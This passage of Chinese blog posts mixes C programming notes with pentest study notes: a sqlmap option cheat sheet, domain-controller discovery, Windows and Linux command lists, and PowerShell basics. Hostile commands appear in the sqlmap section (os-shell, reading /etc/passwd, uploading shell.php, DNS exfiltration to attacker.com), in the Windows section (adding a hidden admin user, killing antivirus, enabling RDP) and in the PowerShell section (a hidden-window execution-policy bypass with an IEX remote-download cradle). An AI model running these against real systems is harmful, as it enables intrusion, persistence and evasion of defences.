*pArr; int i; printf("请输出要存放元素的个数："); scanf("%d", &amp;len); // 5 pArr = (int *)malloc(4*len); // 数组长度为len； 5*4=20,（默认pArr指向第一个字节，但是由于进行了int强转，所以pArr指向前四个字节,pArr指向后面4个字节） //类似于 int pArr[len]; //赋值 for (i=0; i&lt;len; ++i) { scanf("%d", &amp;pArr[i]); } //输出 printf("一维数组的内容是: \n"); for (i=0; i&lt;len; ++i) { printf("%d, ", pArr[i]); } realloc(pArr, 40); // 扩展 //释放数组 free(pArr); } //动态内存和静态内存的比较 void dynami_memo4() { /* 静态内存是由系统自动分配，由系统自动释放，是在栈分配的 动态内存是由程序员手动分配，手动释放，是由堆分配的 malloc是堆分配的 栈是存储结构，堆是排序方式 */ } void multi_test(int **pp) { int j=300; // pp是p的地址，那*pp 就是p *pp = &amp;j; // 修改 **pp = 200; // 修改 } //多级指针（意义：跨函数使用内存） void two_pointer() { // 【场景】：当在子函数中需要修改主函数某一个一级指针变量的值，就需要二级指针 //char b[N][10] = {"lilei","hanmeimei","xiyangyang","huitailang", "xiongda"}; //char * p[N]; // 指针数组，里面存储的指针类型就是 二级指针 // &amp;p[0] 每次偏移是固定的，64位数下就是8个字节 //// char **p2; //int i; //for(i=0; i&lt;N; i++) //{ // p[i] = b[i]; //} //for(i=0; i&lt;N; i++) //{ // puts(p[i]); //} int i = 10; int *p = &amp;i; int **q = &amp;p; int ***r = &amp;q; //r = &amp;p; // 错误，因为r是int**类型，r只能存放int**类型变量的地址 printf("%d",***r); // r的值 //在另一个函数内部改变变量值 multi_test(&amp;p); // p是int *, 那么 &amp;p是int** } void f1(int **q) { int i=5; //*q等价于p，q和**q都不等价于p // *q=i // error *q = &amp;i; // p=&amp;i //**q=i; } //静态变量不能跨函数使用 void dynami_memo5() { int *p; f1(&amp;p); printf("%d", *p); // 本语句语法没有问题，但逻辑上有问题（因为f函数中i的静态分配的，f结束，i的空间就释放了） } void f2(int **q) { *q = (int *)malloc(sizeof(int)); // 等价于p = (int *)malloc(sizeof(int)); //q=5; // error //*q=5; // p=5 error **q=5; // *p=5 } //动态内存可以跨函数使用（重点） void dynami_memo6() { int *p; f2(&amp;p); printf("%d", *p); // 能改变。p指向的是上面堆里面分配的空间 } 结构体jiegouti.h #include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> void test(); void struc_func(); void InputStudent(struct Student *); void OutputStudent(struct Student); void OutputStudent2(struct Student *); void test_union(); main.c #include "jiegouti.h" void main() { } void test() { /* 为什么需要结构体？ 为了表示一些复杂的事物，而普通的数据类型无法满足实际需求 结构体： 把一些基本类型组合到一起，形成的一个新的符合数据类型 大小： 结构体：总大小一般情况下等于各成员大小之和(先不考虑内存对齐) 共用体：大小等于成员中最大的那个大小。（通常和结构体一起使用） 如何定义(推荐第一种)： 1. 推荐（这只是定义了一个新的数据类型，并没有定义变量） struct student{ int num; char name[20]; int age; }; 2. 这样只能定义一次 struct student{ int num; char name[20]; int age; } st1; 3. 类型都没写... struct { int num; char name[20]; int age; } st1; //赋值和初始化(定义同时可以整体赋值,定义玩之后只能单个赋值) 定义同时初始化： struct student s1 = {1,'xxx',18}; 先定义，后赋值： struct student s2; s2.num=1; s2.name='yyy'; s2.age=19; //取出结构体变量中每一个成员【重点】 1.结构体指针变量名.成员名 2.指针变量名->成员名 （第二种更常用） struct student *p = &amp;s; //注意是&amp; p->name; //第一种方式(指针变量->成员变量名,在计算机内部会被转换为(*指针变量名).成员名) (*p).name; //第二种方式，与 s.name; 等价 //结构体变量的运算 结构体变量不能相加，相减，也不能相互乘除。 但结构体变量可以相互赋值 //结构体变量和结构体变量指针作为函数参数传递的问题 //动态构造结构体数组 //链表 */ int num; struct student{ int num; char name[20]; char gender; int age; float score; char addr[30]; } ss={1,'xx','nan',20,99.9,'hhh'}; // ss就是变量 可以直接在这里初始化 //赋值和初始化 struct student ss2 = {2,'yy','bei',20,99.9,'zzz'}; struct student s = {100,'lala','M',20,99.5, 'beij'}; // 结构体数组 struct student sArr[3]; for (int i = 0; i &lt; 3; i++) { scanf("%d%s %c%d%f%s", &amp;sArr[i].num, sArr[i].name, &amp;sArr[i].gender, &amp;sArr[i].age,&amp;sArr[i].score, &amp;sArr[i].addr); // %c 忽略空格 } // 结构体指针 struct student *p = &amp;s; //注意是&amp; //p = &amp;s; // 获取成员 p->name; //第一种方式(指针变量->成员变量名,在计算机内部会被转换为(*指针变量名).成员名) (*p).name; //第二种方式，与 s.name; 等价 // p->name的含义：p所指向的那个结构体变量中的name这个成员 num = p->num++; // num = p->num, num=p->num+1; //优先级 // 第一时间去掉++ num = p++->num; // 没问题, num=p->num, p=p+1 //浮点型默认在C语言中是double，如果要定义成float，则在后面加f或F， 但是不能准确存储 } /////////////////////////////////////////// struct Student{ int num; char name[20]; int age; }; // 通过函数完成对结构体变量的输入和输出 void struc_func() { struct Student st; InputStudent(&amp;st); //对结构体变量输入 OutputStudent(st); //对结构体变量输出 OutputStudent2(&amp;st); //对结构体变量输出 } void InputStudent(struct Student * pstu) //pstu只占4个字节 { (*pstu).num=1; strcpy(pstu->name, "xxx"); pstu->age=18; }; /* 这是无法改变主函数的值的 void InputStudent(struct Student stu) { stu.num=1; strcpy(stu.name, "xxx"); stu.age=18; };*/ ////应该发送内容还是传送地址？ //如果传递的是内容，内存消耗大 void OutputStudent(struct Student stu) { printf("%d, %s %d", stu.num,stu.name, stu.age); } // 如果传递的是地址，可能不安全，但是提高了速度，节省了内存（推荐这种方法） void OutputStudent2(struct Student *pstu) { printf("%d, %s %d", pstu->num,pstu->name, pstu->age); } /* 【指针优点大总结：】 快速的传递数据，较少了内存的消耗 【重点】 使函数返回一个以上的值 【重点】 能直接访问硬件 能方便的处理字符串 **/ //共用体 void test_union() { //共用体：大小等于成员中最大的那个大小（通常和结构体一起使用） // union 共用体name // { // 成员表列 // } 变量表列; union data{ int i; char c; float f; }u1; // 共用体的起始地址和每个成员的起始地址是相同的 // 一个时间内只能存取一个成员 union data d; // 现在最大的就是4 d.i = 4; d.c='A'; d.f = 99.9; } typedef//1) 为基本数据类型定义新的类型名 typedef double REAL; //2) 为自定义数据类型（结构体、共用体和枚举类型）定义简洁的类型名称 typedef struct tagPoint { double x; double y; double z; } Point; /* 实际上完成了两个操作： 1、定义了一个新的结构类型 struct tagPoint { double x; double y; double z; } ; 2、使用 typedef 为这个新的结构起了一个别名，叫 Point typedef struct tagPoint Point */ //3) 为数组定义简洁的类型名称 typedef char* PCHAR; PCHAR pa NULL二进制全部为0的含义： 1.数值为0 2.字符串结束标记符 '\0' 3.空指针NULL NULL表示编号为0的地址 NULL表示的是零，不是数字，而是代表内存单元的编号 计算机规定了，以零为编号的存储单元的内存不可读、不可写 文件//文件 void test_file() { # define N 20 FILE *fp; char c; char p; char ret; char buf[N] = {0}; // 先初始化 // fp = fopen("file.txt", "r"); fp = fopen("D:\Desktop\1.txt", "r+"); // argv[1] 是传递的第一个参数 if(fp == NULL) // 判断打开是否成功， -> 失败 { perror("fopen"); // 定位函数执行错误原因（只能定位刚刚执行的） goto error; } // fgetc 读取，一次读取一个字节 while ((c = fgetc(fp)) != EOF) { printf("%c",c); } // fputs 写入，一次写入一个字节 p = 'H'; ret = fputc(p, fp); // printf(FILE *fp,const char *format, ...) 函数来写把一个字符串写入到文件中 fprintf(fp, "This is testing for fprintf...\n"); // fread: buf没有\0 ret = fread(buf, sizeof(char), N, fp); printf("%d, %s \n", ret, buf); // fwrite: strcpy(buf, "word"); ret = fwrite(buf, sizeof(char), strlen(buf), fp); // 清空buffer memset(buf,0,sizeof(buf)); // fseek fseek(fp, 0, SEEK_SET); // 移动到开头。 SEEK_SET,偏移量的起始点:文件开始处 fseek(fp, -12, SEEK_CUR); // 往回偏移, 与磁盘上实际的字节数对应。 SEEK_CUT:文件当前位置 // SEEK_END,偏移量的起始点：SEEK_END // ftell 获取文件读写指针的当前位置 long last = ftell(fp); fclose(fp); error: printf("error!!!"); // fclose(fp); // 关闭文件 } document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>C语言</tag>
        <tag>琐碎复习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmap参数简介]]></title>
    <url>%2Fposts%2F53327%2F</url>
    <content type="text"><![CDATA[概述 官网 其他特性： 数据库直接连接 -d, 不通过SQL注入，执行身份认证信息，ip，端口 与BurpSuite，Google结合使用，支持政策表但是限定测试目标 支持Basic, Digest, BTLM, CA 身份认证 db版本， 用户，权限，hash枚举和字典破解，暴力破解表列名称 文件上传下载，UDF， 启动并执行存储过程，操作系统命令执行，访问win注册表 与w3af， metasploit集成结合使用，基于数据库服务进程提权和上传执行后门 升级: # 在线更新sqlmap sqlmap --update # 离线升级 git pull 其他常识： # 结果文件夹位置 /.root/sqlmap/output # 日志 .sqlmap # 配置文件 自己找 基本参数1. Target Get方法： -u url链接 # get链接 -f # 检查DBMS的指纹信息 -p user_name # 指定字段参数 -m list.txt # 扫描url列表文件 -g # google搜索,自动去google找到然后自动注入 \” 是转义引号，如下所示： # 例如： sqlmap -g "inurl:\".php?id=1\" # 结果文件夹位置 /.root/sqlmap/output -- users # 有哪些user --banner # banner 信息 --dbs # 有哪些库 --schema #元数据(查的是informatin_schema信息，前提是有权限) -a # 所有的 -d “mysql://root:@192.168.20.10:3306/dvwa” # 让sqlmap作为客户端链接数据库（dvwa是数据库名称） Post方法：就不是通过url来扫描了，而是body来进行扫描 -r request.txt # 使用http请求文件进行注入（burpsuite拦截的请求数据包复制保存到文件, 存在注入的位置用*标出） -l log.txt # 使用burpsuite log文件 （使用burpsuite:option-> Misc ->logging -> 这里选择Proxy-> 这里选择requests-> 选择log文件保存位置 ） --force-ssl # 支持Https，即听过https来进行请求，或在url域名后+443端口也可以 -c sqlmap.conf # 扫描配置文件（把扫描配置写到里面，把它引用即可） # 查找文件 dpokg -L # 找有关..的文件包 dpokg -L sqlmap | grep sqlmap.conf 2. Request post请求 --data="user=xx&amp;pswd=yy" # 数据（对于post请求：除了保存请求头的方法，也可以这样data加参数， 也支持get方法：参数放--data后面） --param-del=";" # 变量分隔符(若多个变量不是以&amp;分割),如：参数以分号分割 --data="name=1;id=11" --param-del=";" --cookie "xxxxxxxxx" --level=2 # 带上cookie头(level=2时才会检查cookie是否存在注入点) 参数: set-cookie / --drop-set-cookie 是否丢弃上一个cookie,使用新的cookie #cookie ---> 登陆后才能访问的页面 --user-agent="xxxxxxxxxx" # 指定ua头 --random-agent --level=3 # 随机ua头字典: /usr/share/sqlmap/txt/user-agents.txt, win下：sqlmap/data/txt/user-agents.txt #--level>=3 # 才会检查user-agent头是否存在sql注入 #app/waf/IPS/IDS过滤异常的ua头，sqlmap会报错 --host "aaaaaaa" --level=5 # host头 --level=5 # 才会检查host头是否存在sql注入(一般不建议设置这么高) --referrer --level=3 # 检查referrer --level >=3 # 才会检查referrer是否存在sql注入 --headers="host:www.a.com\nUser-Agent:xps" # 额外的自定义的headers（\n是换行，注意大小写） --headers="X-Forwarded-For:* " --dbs --batch --method=GET/POST # 限定请求方法 基于http身份认证 三种身份认证类型： Basic Diagest NTLM --auth-type Basic --auth-cred "user:pass" # --auth-type指定身份认证类型，后门是账号密码 基于客户端证书的身份认证 : # 用的很少 # 下面两种参数不知道是哪个了，使用的时候自己查一下 --auth-cert --auth-file="ca.PEM" #含有私钥的PEM的证书文件 http(s)代理使用代理防止被封等 --proxy="http://127.0.0.1:8888" # 本地网络的话不需要代理设置 --auth-cred "user:pass" # 如果需要身份认证 --ignore-proxy # 忽略系统代理设置，通常用户扫描本地网络目标（用于对本地/内容目标进行扫描的时候） 超时 --deplay="6" # 每次请求之间延迟时间， 单位:s --timeout="10" # 请求超时时间，浮点数，默认30s --retries="5" # 连接超时重试次数，默认3次 --randomsize="id" # 长度、类型与原始值保持一致的前提下，指定每次请求随机取值 的参数name（对id随机取值,但长度与原始是一致的） --scope # 过滤日志(burp的request日志-->option,Logging,proxy,requests)内容， 通过正则筛选扫描对象； -l burp.log --scope="{www}?\.target\.{com|net|org}" --level=3 --safe-url / --safe-freq # 检测和盲注阶段会产生大量失败请求，服务端可能因此销毁session。 #因此：每发送 --safe-freq次注入请求之后，发送一次正常的请求 --skip-urlencode # 跳过url编码(默认GET方法会对内容进行编码，某些编码人员不遵守编码规则没编码) --eval="import hashlib;hash=hashlib.md5(id).hexdigest()" # 每次请求之前执行的py代码 / 每次请求更改或者增加新的参数值（时间依赖。其他参数依赖）后面值是依赖前面值的 -u "id=1?hash=c4ca423dj8caf5d" --eval ="import hashlib;hash=hashlib.md5(id).hexdigest()" # 比如后面参数是hash的，每次都把id编码 ` 3. Detection 风险等级​`bash –level # 1-5级（默认1） payload文件xml：/usr/share/sqpmap/xml/payloads， win：sqlmap\data\xml\payloads –risk # 1-4级(默认1/无害), risk升高可能造成数据被篡改风险(update),2会增加事件的测试语句，3会增加OR语句的sql注入测试 –string / –not-string / –regexp / –code / –text-only / –titles # 页面比较，基于bool的注入监测，依据返回页面内容的百年华判断真假逻辑。但有些页面随着时间阈值变化，此时需要人为执行标识真假的字符串 #### &lt;font color=red&gt;4. Optimization &lt;/font&gt; 优化性能相关的参数 ```bash --predict-output # 预设输出。根据检测方法，比对返回值和统计表内容，不断缩小监测范围；版本名，用户名，密码，Provileges，role，db名，表名，列名； #与--threads不兼容；统计表 #进而精确定位是什么数据库和版本等， /usr/share/sqlmap/txt/common-outputs.txt --keep-alive # 使用长连接，性能好，与--proxy不兼容， 但是大量长连接会严重占用服务器资源 --null-connection # 只获取相应页面大小值，而非内容； 【用于盲注判断 真假】，降低网络带宽消耗；与--text-only参数不兼容(基于页面内容比较判断 真假) --threads=10 # 最大并发线程，盲注时每个线程获取一个字符（7次请求），获取完成后线程结束；默认1，建议不要大于10（可能会影响站点性能） -o # 开启前三个性能参数（除了--threads） 指纹信息 # Figerprint -f / --figerprint / -b / --banner # dbms指纹信息； DBMS，操作系统，架构，补丁 ​ 5. Enumeration 枚举 --schema --batch --exclude-sysdbs # sschema:元数据(使用默认选项) -- batch:自动执行 --count -a # --all -b # --banner --current-user --current-db --hostname # 机器的主名 --is-dba --users # 列出所有用户 --passwords --privileges -U user_name # 查看用户的权限（不加-U就是查当前用户） --roles --dbs # 列出所有数据库 --tables --columns --schema # 列出information_schema信息 --schema --exclude-sysdbs # Dump数据： --dump # 获取表中的数据，包括列 --stop --dump-all exclude-sysdbs # 除了系统库,... -C # column -T glag_table -D dvwa -X -U # user --start 100 --stop 200 # 指定分段 --stop --sql-query "select * from users" # 后面加要执行的sql语句 --exclude-sysdbs # 除去系统库 --pivot-column=P... # # 指定库表的列 -D dvwa -T users --columns # dump数据 -D dvwa -T users --dump 暴力破解是基于字典的 # mysql &lt;5.0没有information_schema库 ， mysql>=5.0如果无权读取... # access 无权读物MSysyObjects库 --common-tables --common-columns # (Access系统表无列信息) 文件系统 FILE SYSTEM: --file-read="/etc/passwd" # 读系统文件 --file-write="shell.php" --file-dest"/temp/shell.php" # 写,前面是源文件，后门是要写入到的文件 UDF注入详细的去查资料吧 UDF injection: (User Design Function) --udf-inject, --shared-lib # 编译共享库创建并上传到DB Server，以此生成UDF实现高级注入。 #Linux：share object, windows:DLL 操作系统 OS: # mysql, postgresql: 上传共享库并生成 sys-exec(), sys_eval()两个UDF # MSsql： xp_cmdshell 存储过程(1.有就用，2.禁就启，3.没就建) --sql-shell --os-shell --os-cmd ​ 6. Miscelianeous: -z # 参数助记符, --answer="extending=N" # 让出现提示的选项都选Y或N --check-waf # 检测WAF/IPS/IDS --hpp # 绕过检测WAF/IPS/IDS的有效方法；尤其对ASP/IIS 和ASP.NET/IIS检查 --identify # 彻底检查WAF/IPS/I -mobile # 模拟智能手机设备 --purge-output # 清除output文件夹 --smart # 当有大量检测目标的时候，只选择基于错误的检测结果 --wizard # 向导方式 7. General-s # sqlite会话文件保存位置 -t # 记录流量文件保存位置 --charset=GBK # 强制字符编码 --crawl=3 # 从起始位置爬站深度 --csv-del=";" # dump数据默认存在于","分割的csv文件中，可以指定其他分隔符 --dbms-cred # 指定数据库账号 --flush-session # 清空session --force-ssl # 让sqlmap知道访问的是https的网站 --fresh-queries # 忽略seeeion查询结果 --hex -v 3 # dump非ASCII字符内容时，将其编码为16进制形式，收到后解码还原 --output-dir="/tmp" --parse-errors # 分析和显示数据库内建保存信息 --save # 将命令保存成配置文件 8. Windows Registory win注册表 # 前提是有权限 --reg-read # 读取 --reg-add # 添加 --reg-del --reg-key, --reg-value, --reg-data, --reg-type='' #..键的值等于... ​ 9. injection注入 -p "id,referrer" 指定扫描参数（即存在注入的那个参数），使 --level失效 --skip="name, user-agent" # 排除指定的扫描参数 --dbms # 判断数据库类型 --dbms="mysql" # 指定只用mysql的方法进行注入 --os='' # 指定系统 --invalid-bignum / --invalid-logical # bignum使用大数使参数值失效id=99999999； logical 使用布尔判断使取值失效 id=13 AND 18=19 --no-cast # 榨取数据时，sqlmap将所有结果转换为str，并将空格替换NULL结果 --no-escape # 关闭功能：（当payload中用单引号界定str时，sqlmap使用char()编码逃逸的方法替换str） --prefix # 前缀 --suffix # 后缀 “...?id=1” -p id --prefix"')" --suffix "AND ('abc'='abc" --tamper="xxxxx, yyyyyy, zzzzzz" # 混淆脚本(可自定义脚本)，染过应用层过滤，ips，waf 位置:/usr/share/sqlmaptamper #伪静态注入(全是斜线，使用“*”符号来自定义注射位置) sqlmap -u "http://www.xxx.com/123/456*/789" -v 4 ​ 10. Techniques技术 #默认使用全部技术 B: Boolean-based bind E: Error-based U: Union auery-based S: Stacked queries (文件系统，操作系统，注册表必须) T: Time-based-bind --time-sec # 基于时间的注入检测相应延迟时间（默认5s） --union-cols 6-9 # 默认联合查询1-10列，随--level增大最多支持50列 --union-char 123 # 联合查询默认使用NULL， 极端情况下NULL可能失败，此时可以手动执行数值 --dns-domain attacker.com # 攻击者控制了DNS服务器，使用此功能可以提高数据榨取速度 --second-order http://1.1.1.1/a.php # 在一个页面注入的结果，在另一个页面体现出来 ​ 小例子获取指定数据库 指定表 指定列 --batch -D 'dbname' -T 'tablename' -C 'username.password' --dump 提权操作 # 数据库提权 --batch --sql-hell # 系统提权 --batch --os-shell # 执行系统命令(前提要有权限) --os-cmd=ls / 把文件上传到数据库服务器中 sqlmap.py --file-write --file-dest "服务器路径" document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[查找域控的几个常用方法]]></title>
    <url>%2Fposts%2F24294%2F</url>
    <content type="text"><![CDATA[查找域控的几个常用方法1.net view net view /domain 2.set log set log 3.通过srv记录 nslookup -type=SRV _ldap._tcp.corp 4.使用nltest nltest /dclist:corp 5.使用dsquery DsQuery Server -domain corp 6.使用netdom netdom query pdc document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>域控</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux找出最近或者今天被修改的文件]]></title>
    <url>%2Fposts%2F10857%2F</url>
    <content type="text"><![CDATA[参考：http://www.hackdig.com/01/hack-42547.htm 0x01 列出某个目录下今天创建或者修改的文件1 显示目录home/ym下，今天创建或者修改的文件ls -al --time-style=+%D | grep 'date +%D' 参数解释： -a - 列出所有文件，包括隐藏文件 -l - 启用长列表格式 --time-style=FORMAT - 显示指定 FORMAT 的时间 +％D - 以 ％m/％d/％y （月/日/年）格式显示或使用日期-a - 列出所有文件，包括隐藏文件 -l - 启用长列表格式 --time-style=FORMAT - 显示指定 FORMAT 的时间 +％D - 以 ％m/％d/％y （月/日/年）格式显示或使用日期 2 按字母顺序对结果排序显示ls -alX --time-style=+%D | grep 'date +%D' 3 按文件大小从大到小对结果排序显示ls -alS --time-style=+%D | grep 'date +%D' 0x02 列出某天所有被修改文件1 列出当前目录今天被修改的文件find . -maxdepth 1 -newermt "2017-1-8" find . -maxdepth 1 -newermt "1/8/2017" 2 列出系统中今天被修改的所有文件find . -newermt "2017-1-8" find . -newermt "1/8/2017" 0x03 查找被访问过的文件1 今天被访问的文件find /home -atime 0 #查看home 目录下今天被访问的文件 2 查看几天之内被访问的文件find . -atime +2 # -atime n, File was last accessed n*24 hours ago.；查看当前目录三天之内被访问的文件 0x04 查看被修改过的文件1 今天被访问的文件find /home -ctime 0 #查看home 目录下今天被修改过的文件 2 查看几天之内被访问的文件find . -ctime +2 # -ctime n, File was last changed n*24 hours ago.；查看当前目录三天之内被修改过的文件 0x05 更多查看文件的用法… … document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux下面一些安全日志文件]]></title>
    <url>%2Fposts%2F62677%2F</url>
    <content type="text"><![CDATA[文件 /var/run/utmp 记录现在登入的用户 文件 /var/log/wtmp 记录用户所有的登入和登出 文件 /var/log/lastlog 记录每一个用户最后登入时间 文件 /var/log/btmp 记录错误的登入尝试（注：可以查看电脑是否正在被爆破） 文件 /var/log/auth.log 需要身份确认的操作(可能存在) document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>日志</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows命令简记]]></title>
    <url>%2Fposts%2F434%2F</url>
    <content type="text"><![CDATA[1、windows系统基础命令ipconfig /all 获取ip地址 linux：ifconfig -a Route print 路由信息 Arp -a arp缓存 Netsh firewall show config 查看防火墙规则 Netsh firewall show state Netstat -an 获取端口信息 Whoami 当前用户权限 Hostname 主机名称 Set 环境变量 Query user 查看远程终端在线用户 Systeminfo 获取操作系统版本、类型、位数等相关信息、安装； -b： 显示包含于常见每个链接或监听端口的可执行组件； -o： 显示与每个连接相关的所属进程ID； -v： 与b一起使用时将显示包含于为所有可执行组件创建连接或者监听端口的组件； Netstat -anb 进程号、端口开放情况、开放端口程序、监听端口组件 Netsata -ano tcp/udp协议信息、端口、进程号 Netstat -anvb 进程号、端口所用协议、调用的可执行组件、第三方进程的系统路径等 Net start 获取服务信息利用第三方漏洞提权、关闭杀毒软件、防火墙、以及关闭某些防护进程 Net stop servicesname 停止服务命令 Net start servicename 开启服务命令 Tasklist /svc 获取运行的进程名称、服务、PID Driverquery 查看已安装驱动程序列表 Net start 查看已经启动的windows服务 Msinfo32 获取更加详细的信息 Taskkill 是windows自带的终止进程程序 TASKKILL [/S system [/U username [/P [password]]]]{ [/FI filter] [/PID processid | /IM imagename] } [/T] [/F] #例如：taskkill /pid 452 /f taskkill /im 360tray /f #用户管理命令： Net user hack 123 /add 添加hack用户 密码为123 Net localgroup adminnistrators hack /add 添加hack为管理员权限 Net localgroup adminnistrators 查看当前系统管理员 Net localgroup "remote desktop users" hack /add 加入远程桌面用户组 Net user hack 查看指定用户的信息 Net user guest /active:yes 激活guest用户 Net user guest 123 2、windows系统开启远程桌面（mstsc/rdesktop）#XP/Win2k3/Win7/Win2k8/Win8.1/Win10/2012/2016（0：ON、1：OFF）： REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f #Win2k3/Win7/Win2k8/Win8.1/Win10/2012/2016：（0：ON、1：OFF）： wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1 #Winserver2008/2012/Win2k3/win7 wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !="") call setallowtsconnections 1 #Winserver2008/2012/ wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1 #XP/Win2k3/Win7/Win2k8/Win8.1/Win10/2012/2016（Metasploit）： meterpreter > run getgui -e 3、查看远程端口通过注册表查看：REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber 查询rdp端口号 set /a port = query hex value 通过命令查看Tasklist /svc |find "TermService" Netstat -ano |find "1980" 本文转载 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>Windows命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PowerShell基础知识]]></title>
    <url>%2Fposts%2F21874%2F</url>
    <content type="text"><![CDATA[PowerShell技术概学 本文内容较琐碎，思路较混乱，仅当入门小小小基础吧 Powershell基础特点 可以面向对象 绑定.net 兼容性好 灵活 基本常识 在PowerShell下，类似 cmd命令 叫作cmdlet 命令规范：动词-名词 ， 不区分大小写 可以直接在cmd中运行powershell来打开 查看PowerShell版本Get-Host 或者 $PSversionTable.PSVERSION ps1文件： 一个PowerShell脚本其实就是一个简单的文本文件 运行脚本1.完整路径2.当前路径:./test.ps1 基本命令Get-Command ： 得到所有PowerShell命令 Get-Process ： 获取所有进程 Get-Help ： 显示有关 Windows PowerShell 命令和概念的信息 Get-History ： 获取在当前会话中输入的命令的列表 Get-Job ： 获取在当前会话中运行的 Windows PowerShell 后台作业 dir –r 执行策略Get-ExecutionPolicy #查看当前策略 - Restricted #脚本不能运行（默认） - RemoteSigned #本地创建的脚本可以运行，但从网上下载的脚本不能运行 - AllSigned #仅当脚本由信任的发布者签名时才能运行 - Unrestricted #允许所有的脚本运行 绕过本地权限执行脚本powershell.exe -ExexutionPolicy ByPass -File xxx.ps1 # -ExexutionPolicy ByPass 绕过执行安全策略 本地隐藏绕过权限执行脚本powershell.exe -ExexutionPolicy ByPass -WindowStyle Hidden -NoLogo -Nolnteractive -NoProfile -File xxx.ps1 # -WindowStyle Hidden 隐藏窗口 # -NoLogo 启动不显示版权标志的PowerShell 用IEX下载远程PS1脚本绕过权限执行脚本powershell.exe -ExexutionPolicy ByPass -WindowStyle Hidden -NoProfile -NonI IEX(New-ObjectNet.WebClient).DownloadString("xxx.ps1");[Parameters] # -NonI 非交互模式 # -NoProfile / -NoP 不加载当前用户的配置文件 # Noexit 执行后不退出Shell （这在使用键盘记录等脚本时非常重要） 可以直接在终端进行数字计算…..笑死 自定义Powershell控制台右键自己看着自己的习惯调整吧编辑选项： 快速编辑选项（操作快且方便） 标准编辑选项 Powershell快捷键与linux中相似 alt+F7 #清除命令的历史记录 PgUp PgDn #翻页的效果 Esc #情况命令行（我还是喜欢 ^L） Home #移动到命令行最左端 End #移动到命令行最右端 Powershell管道和重定向基于对象的 管道： #找字符串 ls | findstr "an" # 查看name列 ls | Format-table name # 还可以sort等 `get-process p* | stop-process` # 找到p...的进程，然后停止 重定向： # >, >> #重定向到文件中 ls | Format-table name >> test.txt Powershell数学运算直接在终端执行即可，无需多讲 进行存储单位换算： 运算/比较 #运算 1gb/1mb*18kb # 比较 1gb -gt 1mb 进制转换，比如十六进制：0xa Powershell执行外部命令打开应用 #直接打开 notepad #或者带双引号 &amp;"notepad" # 直接打开服务 services.exe # 查看环境变量 $env:path # 仅在当前终端设置环境变量（临时生效） $env$path=$env$path+"路径" Powershell命令集 一般是动词-名词结构 查看所有命令：Get-Command查看命令帮助: get-help查看命令历史：get-history Powershell别名使用 # 查看所有别名 get-alias # 可以查看命令别名 get-help 命令 # 查看别名对应的真实的命令 get-alias -name ls # 找出以remove开头的别名(): get-alias | where {$_.definition.startswitch("Remove")} # 查询所有别名最多的，并排序 get-alias |group-object definition |sort -descending Count 自定义别名 # 临时定义（退出终端就不生效了） set-alias -name pad -value notepad` # 删除别名 del alias pad ## 永久设置别名（写入Windows PowerShell profile文件） #1.查看此文件在计算机中的位置： $profile #2.一般该文件在没有创建前是不存在的，使用以下命令为当前用户创建profile命令并返回文件地址： New-Item -Type file -Force $profile #3.打开文件将一些内容写入文件，创建别名，比如; 